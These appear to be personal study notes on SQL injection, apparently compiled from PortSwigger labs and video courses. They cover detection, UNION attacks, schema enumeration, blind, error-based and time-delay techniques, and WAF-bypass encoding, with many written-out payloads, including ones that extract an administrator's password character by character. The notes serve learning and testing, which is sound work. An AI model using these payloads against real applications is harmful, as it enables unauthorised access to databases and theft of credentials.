# References:
- Michael Sommer videos
- [SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQL Injection Cheatsheet by Invicti](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [Burp Extension - Hackvertor for payload encoding](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)
- [Rana Khalil Youtube Playlist](https://www.youtube.com/playlist?list=PLuyTk2_mYISItkbigDRkL9BFpyRenqrRJ)
- [Z3nsh3ll Youtube Playlist)(https://www.youtube.com/playlist?list=PLWvfB8dRFqba0CSHMY23ih0tUNrK9iEJv)
# Automated tools & Extensions
- SQLmap
- Ghauri
- Hackvertor (for payload encoding)
# How to detect it
Single quote character `'` and look for errors or anomalies
Boolean conditions such as `OR 1=1` and `OR 1=2`
Payloads that trigger time delays when executed
# Payload encoding
Payloads might need to be encoded in several different ways
## Note
While constructing these queries use a cheatsheet, some tricks are needed:
- Encode whitespaces `+` or `%20`
- Comment the end of the query e.g.: `--` depending on the type of database
- HTML entities, XML encoding, and more (use Hackvertor whenever useful to encode the payloads)
# Where in the query do SQL injections occur?
They can occur in any location of the query
## Most common
- WHERE clause
- SELECT clause
## Other common locations
- UPDATE statements, in the updated values
- INSERT statements, in the inserted values
- SELECT statements, in the table or column name
- SELECT statements in the ORDER BY clause
# Some successful exploits can lead to
- Retrieval of data
- Subverting application logic
# SQL UNION Attacks
Use the `UNION` keyword to execute more than one `SELECT` query
The following conditions have to be met for this to work
- The queries must return the same number of columns
- The data types must be compatible
## Determining the number of columns required
- Using `ORDER BY` until an error occurs
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
- Using the `UNION SELECT NULL` method
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
## Database-specific syntax
Different databases use different syntax. Use a cheatsheet to help navigate the syntax differences
The Portswigger page shows some examples
## Finding columns with a useful data type
- Using the `UNION SELECT NULL` method
Replace the `NULl` with the desired data type to see if that column is compatible
If an error occurs then the column is not compatible
If the application's response contains the injected content, the the data type is compatible
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
## Retrieving multiple values within a single column
Sometimes only one column is compatible with the data type we need.
Concate the values together
Use a cheatsheet as a guide for the syntax
```sql
' UNION SELECT username || '~' || password FROM users--
```
# Examining the database
Find out the type and version of the database software
Find out the tables and columns that the database contains
## Finding the type and version
Use the cheatsheet
Below is a short reference
```
---------------------------------------------
DATABASE TYPE       | QUERY                 |
---------------------------------------------
Microsoft, MySQL    | SELECT @@version
Oracle              | SELECT * FROM v$version
PostgreSQL          | SELECT version()
```
Using an UNION attack
`' UNION SELECT @@version--`
## Listing contents
Use the cheatsheet
Use `information_schema.tables`
```sql
SELECT * FROM information_schema.tables
```
Output
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```
Use `information_schema.columns`
```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
Output
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
# Stacked Queries
Execute multiple queries in succession
An example is below. See the cheatsheet for more examples
```sql
query-1; query-2
```
# Blind SQL Injection
There is an injection vulnerability but it is not visible in the server response
There are many different techniques to exploit it. Some are discussed below
## Blind SQL Injection - Triggering Conditional Responses
Tracking cookies are points of injection
Try a single boolean condition
```
…xyz' AND 1=1-- // This returns True
…xyz' AND 1=0-- // This returns False
```
Archetype payload
```sql
xyz' AND boolean-condition--
xyz' AND (what I want to find out)=test-value--
xyz' AND (SELECT something)=test-value--
xyz' AND (SELECT SUBSTRING(something,1,1) rest-of-query)=test-value--
xyz' AND SUBSTRING((SELECT query-here),1,1)=test-value--
```
Sample payloads
This is to determine if something is true
```sql
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
Password length
```sql
xyz' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH (password)>10)='administrator'--
```
This is to enumerate the password characters
```sql
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```
This is another way to enumerate the password characters
```sql
xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 's'--
```
## Error-based SQL injection
Use and error to extract or infer information from the database
- The database error outputs the data returned from the query. Use the verbose error to extract the data:
Test with valid SQL queries, then see how to trigger an error. See if the error exposes data that might be interesting
Use the CAST method described in the modules (Use cheatsheet for other types of SQL databases)
```sql
' AND 1=CAST((SELECT somethin FROM table LIMIT 1) AS int)--
```
- The database could return a generic error, in that case we can use the conditional response technique to cause an error if the query equals TRUE
```sql
Generic
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'--
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--
Guess password
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'--
xyz' || (SELECT CASE WHEN rest-of-query...
```
## Blind SQLi - Time delays
If the application catches database errors and handles them appropriately then the previous technique won't be successful
Time delays based on true or false condition could be used extract data
```sql
'||pg_sleep(10)--
'||(select case when (query/condition) then pg_sleep(10) selse pg_sleeip(-1) end)--
```
## Blind SQLi - Out-of-band (OAST) techniques
Useful for asynchronous sql queries
Trigger out-of-band network interactions. DNS queries are good for this
See the cheatsheet for database specific payloads
```sql
' UNION payload--
' || (payload)--
```
# SQL in different context
To bypass WAF encoding might be needed. This can be done manually or with a Burp Suite Extension (Hackvertor)
```sql
&#x53;ELECT * FROM information_schema.tables
```
